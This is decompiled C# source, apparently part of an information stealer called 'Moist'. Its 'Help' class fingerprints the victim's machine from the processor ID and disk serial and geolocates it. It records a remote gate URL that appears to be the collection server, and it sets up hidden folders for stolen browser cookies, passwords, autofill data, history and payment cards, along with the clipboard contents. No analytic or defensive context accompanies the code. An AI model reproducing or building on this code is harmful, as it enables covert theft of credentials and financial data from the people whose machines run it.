using System;
using System.IO;
using System.Management;
using System.Net;
using System.Windows;
using System.Xml;

namespace Moist
{
	// Token: 0x02000006 RID: 6
	public class Help
	{
		// Token: 0x0600000A RID: 10 RVA: 0x0000570C File Offset: 0x0000390C
		public static string smethod_0()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00005760 File Offset: 0x00003960
		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000057B4 File Offset: 0x000039B4
		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				string text = managementObject["VolumeSerialNumber"].ToString();
				result = text;
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00005820 File Offset: 0x00003A20
		public static string GetProcessorID()
		{
			string result = "";
			string queryString = "SELECT ProcessorId FROM Win32_Processor";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = (string)managementObject["ProcessorId"];
			}
			return result;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x0000446C File Offset: 0x0000266C
		public Help()
		{
			Class40.gcO0h7LzslQIW();
			base..ctor();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000058A0 File Offset: 0x00003AA0
		// Note: this type is marked as 'beforefieldinit'.
		static Help()
		{
			Class40.gcO0h7LzslQIW();
			Help.DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			Help.LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			Help.System = Environment.GetFolderPath(Environment.SpecialFolder.System);
			Help.AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Help.CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
			Help.MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			Help.UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			Help.SysPatch = new string[]
			{
				Help.LocalData,
				Help.AppDate,
				Path.GetTempPath()
			};
			Help.RandomSysPatch = Help.SysPatch[new Random().Next(0, Help.SysPatch.Length)];
			Help.Mut = Help.HWID;
			Help.HWID = Help.GetProcessorID() + Help.GetHwid();
			Help.GeoIpURL = "http://ip-api.com/xml";
			Help.ApiUrl = "https://moist.company/gate.php";
			Help.IP = new WebClient().DownloadString("https://api.ipify.org/");
			Help.dir = string.Concat(new string[]
			{
				Help.RandomSysPatch,
				"\\",
				Class2.smethod_0(),
				Help.HWID,
				Class2.smethod_2().ToString()
			});
			Help.Moist_Dir = string.Concat(new string[]
			{
				Help.dir,
				"\\",
				Class2.smethod_2().ToString(),
				Help.HWID,
				Class2.smethod_0()
			});
			Help.Browsers = Help.Moist_Dir + "\\Browsers";
			Help.Cookies = Help.Browsers + "\\Cookies";
			Help.Passwords = Help.Browsers + "\\Passwords";
			Help.Autofills = Help.Browsers + "\\Autofills";
			Help.Downloads = Help.Browsers + "\\Downloads";
			Help.History = Help.Browsers + "\\History";
			Help.Cards = Help.Browsers + "\\Cards";
			Help.date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");
			Help.LoggerLog = Help.LocalData + "\\" + Help.HWID + ".txt";
			Help.ClipBoard = Clipboard.GetText();
		}

		// Token: 0x04000004 RID: 4
		public static readonly string DesktopPath;

		// Token: 0x04000005 RID: 5
		public static readonly string LocalData;

		// Token: 0x04000006 RID: 6
		public static readonly string System;

		// Token: 0x04000007 RID: 7
		public static readonly string AppDate;

		// Token: 0x04000008 RID: 8
		public static readonly string CommonData;

		// Token: 0x04000009 RID: 9
		public static readonly string MyDocuments;

		// Token: 0x0400000A RID: 10
		public static readonly string UserProfile;

		// Token: 0x0400000B RID: 11
		public static string[] SysPatch;

		// Token: 0x0400000C RID: 12
		public static string RandomSysPatch;

		// Token: 0x0400000D RID: 13
		public static string Mut;

		// Token: 0x0400000E RID: 14
		public static string HWID;

		// Token: 0x0400000F RID: 15
		public static string GeoIpURL;

		// Token: 0x04000010 RID: 16
		public static string ApiUrl;

		// Token: 0x04000011 RID: 17
		public static string IP;

		// Token: 0x04000012 RID: 18
		public static string dir;

		// Token: 0x04000013 RID: 19
		public static string Moist_Dir;

		// Token: 0x04000014 RID: 20
		public static string Browsers;

		// Token: 0x04000015 RID: 21
		public static string Cookies;

		// Token: 0x04000016 RID: 22
		public static string Passwords;

		// Token: 0x04000017 RID: 23
		public static string Autofills;

		// Token: 0x04000018 RID: 24
		public static string Downloads;

		// Token: 0x04000019 RID: 25
		public static string History;

		// Token: 0x0400001A RID: 26
		public static string Cards;

		// Token: 0x0400001B RID: 27
		public static string date;

		// Token: 0x0400001C RID: 28
		public static string LoggerLog;

		// Token: 0x0400001D RID: 29
		public static string ClipBoard;
	}
}
